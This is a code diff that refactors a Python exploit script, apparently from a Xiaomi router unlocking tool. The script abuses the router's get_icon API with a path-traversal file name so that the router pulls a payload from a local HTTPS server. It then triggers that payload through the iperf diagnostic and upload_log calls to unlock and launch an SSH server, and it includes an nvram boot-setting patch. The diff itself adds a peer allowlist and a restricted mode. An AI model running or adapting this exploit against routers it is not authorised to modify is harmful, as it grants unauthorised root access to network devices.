@@ -9,43 +9,40 @@ import xmir_base
 from gateway import *
 
 web_password = True
-if len(sys.argv) > 1 and sys.argv[0].endswith('connect7.py'):
-    if sys.argv[1]:
-        web_password = sys.argv[1]
-
-try:
-    gw = inited_gw
-except NameError:
-    gw = create_gateway(die_if_sshOk = False, web_login = web_password)
+autorun_invoked = False
 
 api_get_icon_status = 0
 srv_fw_rule = 'XMiR-Patcher'
 srv_ip_addr = None
 srv_port = 8080
 
-with gw.api_request("API/xqsystem/get_icon", stream = True, timeout = 5) as resp:
-    try:
-        srv_ip_addr, _ = resp.raw._connection.sock.getsockname()
-    except Exception:
-        raise ExploitNotWorked('Exploit "get_icon" not working!!! (cannot get srv_ip_addr)')
-    try:
-        resp.raise_for_status()
-    except:
-        raise ExploitNotWorked('Exploit "get_icon" not working!!! (API not founded)')
-    for chunk in resp.iter_content(chunk_size = 8192): 
-        if chunk.startswith(b'\x89PNG'):
-            api_get_icon_status = 1
+def should_autorun(module_name, module_globals):
+    return module_name == '__main__' or 'inited_gw' in module_globals
 
-if api_get_icon_status <= 0:
-    raise ExploitNotWorked('Exploit "get_icon" not working!!! (api not founded)')
+def probe_get_icon(active_gw):
+    global srv_ip_addr, api_get_icon_status
+    api_get_icon_status = 0
+    with active_gw.api_request("API/xqsystem/get_icon", stream = True, timeout = 5) as resp:
+        try:
+            srv_ip_addr, _ = resp.raw._connection.sock.getsockname()
+        except Exception:
+            raise ExploitNotWorked('Exploit "get_icon" not working!!! (cannot get srv_ip_addr)')
+        try:
+            resp.raise_for_status()
+        except Exception:
+            raise ExploitNotWorked('Exploit "get_icon" not working!!! (API not founded)')
+        for chunk in resp.iter_content(chunk_size = 8192):
+            if chunk.startswith(b'\x89PNG'):
+                api_get_icon_status = 1
+    if api_get_icon_status <= 0:
+        raise ExploitNotWorked('Exploit "get_icon" not working!!! (api not founded)')
+    return srv_ip_addr
 
 
 import hashlib
 import traceback
 import ctypes
 import subprocess
-
-print('API "xqsystem/get_icon" has been detected! Try to exploit...')
 
 def is_root():
     if os.name == 'nt':
@@ -94,10 +91,11 @@ def gen_rule_name(prefix, app):
         app = get_python_exe()
     return prefix + '_' + hashlib.md5(app.lower().encode('utf-8')).hexdigest()
 
-if not is_root():
-    print('WARN: The current process does not have root privileges!')
-
-if os.name == 'nt':
+def prepare_host_firewall():
+    if not is_root():
+        print('WARN: The current process does not have root privileges!')
+    if os.name != 'nt':
+        return
     rule_app = get_python_exe()
     rule_name = gen_rule_name(srv_fw_rule, rule_app)
     txt = get_firewall_rule(rule_name)
@@ -119,6 +117,7 @@ srvInitEvent = threading.Event()
 class XmirHttpServer(HTTPServer):
     timeout = 3
     retcode = 0
+    allowed_peer = None
     
     def server_bind(self):
         import ssl
@@ -156,6 +155,11 @@ class HttpHandler(BaseHTTPRequestHandler):
         
     def do_GET(self):
         print(f'SERVER: get request = {self.path}')
+        allowed = getattr(self.server, 'allowed_peer', None)
+        if allowed and self.client_address[0] != allowed:
+            self.server.retcode = -20
+            self.send_error(HTTPStatus.FORBIDDEN)
+            return
         if self.server.action_path not in self.path:
             print(f'ERROR: Incorrect request from client!')
             self.server.retcode = -10
@@ -170,16 +174,23 @@ class HttpHandler(BaseHTTPRequestHandler):
         print(f'SERVER: send response to client (len = {body_size} bytes)')
         self.server.retcode = 1
 
-def wait_req_and_send_resp(path, data, bind_addr = '0.0.0.0', ret_code = None, timeout = 3):
+def wait_req_and_send_resp(path, data, bind_addr = '0.0.0.0', ret_code = None, timeout = 3, allowed_peer = None):
     global srv_port
     srv = XmirHttpServer((bind_addr, srv_port), HttpHandler)
     srv.action_path = path
     srv.resp_body = data.encode('utf-8') if isinstance(data, str) else data
     srv.timeout = timeout
-    srv.handle_request()
-    if isinstance(ret_code, list):
-        ret_code[0] = srv.retcode
-    srv = None
+    srv.allowed_peer = allowed_peer
+    try:
+        srv.handle_request()
+    finally:
+        code = srv.retcode
+        try:
+            srv.server_close()
+        except Exception:
+            pass
+        if isinstance(ret_code, list):
+            ret_code[0] = code
 
 
 payload_def_num = 22
@@ -230,38 +241,44 @@ payload_add_func('patch_nvram', r"""
     nvram set bootdelay=3; nvram set bootmenu_delay=5; nvram commit
 """)
 
-def install_exploit(api = 'API/xqsystem/get_icon'):
+def install_exploit(api = 'API/xqsystem/get_icon', allowed_peer = None, srv_timeout = 3):
     #######
     # vuln/exploit author: remittor
     # exploit public: https://archive.md/1PWkM
     # discovery date: 2024-12-30
     #######
     global gw, srv_ip_addr, srv_port, srvInitEvent
+    if getattr(gw, 'ssh_only', False) and not allowed_peer:
+        raise ExploitError('restricted mode requires a listener source address')
     from threading import Thread
-    srv_timeout = 3
-    ret_code = [ None ]    
+    ret_code = [ None ]
     srvInitEvent.clear()
-    server = Thread(target = wait_req_and_send_resp, args = [ payload_name, payload_body, srv_ip_addr, ret_code, srv_timeout ])
+    server = Thread(target = wait_req_and_send_resp, args = [ payload_name, payload_body, srv_ip_addr, ret_code, srv_timeout, allowed_peer ])
     server.start()
-    event_set = srvInitEvent.wait(timeout = 15)
-    if not event_set:
-        raise RuntimeError(f'Cannot initialize custom HTTPS server on TCP port {srv_port}')
-    params = { 'ip': f'{srv_ip_addr}:{srv_port}', 'name': f'/../..{payload_name} dummy' }
-    resp = gw.api_request(api, params, stream = True, timeout = 12)
     try:
-        resp.raise_for_status()
-    except Exception:
-        raise ExploitNotWorked(f'Exploit "get_icon" not working!!! Cannot transfer Payload to router!')
-    resp_body = b''
-    for chunk in resp.iter_content(chunk_size = 8192): 
-        resp_body += chunk
-    print(f'Readed response size = {len(resp_body)} bytes')
-    server.join(timeout = 10)
+        event_set = srvInitEvent.wait(timeout = 15)
+        if not event_set:
+            raise RuntimeError(f'Cannot initialize custom HTTPS server on TCP port {srv_port}')
+        params = { 'ip': f'{srv_ip_addr}:{srv_port}', 'name': f'/../..{payload_name} dummy' }
+        resp = gw.api_request(api, params, stream = True, timeout = 12)
+        try:
+            resp.raise_for_status()
+        except Exception:
+            raise ExploitNotWorked(f'Exploit "get_icon" not working!!! Cannot transfer Payload to router!')
+        resp_body = b''
+        for chunk in resp.iter_content(chunk_size = 8192):
+            resp_body += chunk
+        print(f'Readed response size = {len(resp_body)} bytes')
+    finally:
+        server.join(timeout = 10)
     if not ret_code[0] or ret_code[0] <= 0:
         raise ExploitNotWorked(f'Exploit "get_icon" not working!!! Cannot transfer payload to router! (ret_code = {ret_code[0]})')
 
 def run_exploit(func_name, timeout = 3):
-    if func_name not in payload_func_list:
+    if getattr(gw, 'ssh_only', False):
+        if func_name not in ('test', 'unlock_ssh', 'run_ssh') or func_name not in payload_func_list:
+            raise ExploitError('restricted mode rejected a command')
+    elif func_name not in payload_func_list:
         if 'set telnet_en=1' in func_name:
             func_name = 'unlock_telnet'
         elif 'telnet restart' in func_name:
@@ -272,29 +289,44 @@ def run_exploit(func_name, timeout = 3):
     gw.set_diag_iperf_test_thr(func_num, timeout = 6)
     try:
         res = gw.api_request("API/xqsystem/upload_log", resp = 'text', timeout = timeout)
-        if '"code":1512' not in res:
+        if '"code":1512' not in (res or ''):
+            if getattr(gw, 'ssh_only', False):
+                raise ExploitNotWorked('diagnostic trigger did not return the expected code')
             print(f'run_exploit: "{func_name}" resp: {res}')
     except requests.exceptions.ReadTimeout:
+        if getattr(gw, 'ssh_only', False):
+            raise
         print(f'run_exploit: "{func_name}" timed out ({timeout} sec)')
         pass
 
 
-install_exploit()
+def run_legacy():
+    global gw, web_password, autorun_invoked
+    autorun_invoked = True
+    web_password = True
+    if len(sys.argv) > 1 and sys.argv[0].endswith('connect7.py'):
+        if sys.argv[1]:
+            web_password = sys.argv[1]
+    try:
+        gw = inited_gw
+    except NameError:
+        gw = create_gateway(die_if_sshOk = False, web_login = web_password)
+    probe_get_icon(gw)
+    print('API "xqsystem/get_icon" has been detected! Try to exploit...')
+    prepare_host_firewall()
+    install_exploit()
+    run_exploit('test')
+    iperf_test_thr = gw.get_diag_iperf_test_thr(timeout = 6)
+    print(f'iperf_test_thr = {iperf_test_thr}')
+    if str(iperf_test_thr) != str(payload_test_num):
+        raise ExploitNotWorked('Exploit "get_icon" not working!!!')
+    run_exploit('unlock_ssh', 7)
+    print('Run SSH server on port 22 ...')
+    run_exploit('run_ssh', 12)
+    time.sleep(0.5)
+    gw.post_connect(run_exploit)
 
-run_exploit('test')
 
-iperf_test_thr = gw.get_diag_iperf_test_thr(timeout = 6)
-print(f'iperf_test_thr = {iperf_test_thr}')
-if str(iperf_test_thr) != str(payload_test_num):
-    raise ExploitNotWorked('Exploit "get_icon" not working!!!')
-
-#print(gw.get_init_info())
-
-run_exploit('unlock_ssh', 7)
-print('Run SSH server on port 22 ...')
-run_exploit('run_ssh', 12)
-
-time.sleep(0.5)
-
-gw.post_connect(run_exploit)
+if should_autorun(__name__, globals()):
+    run_legacy()
 
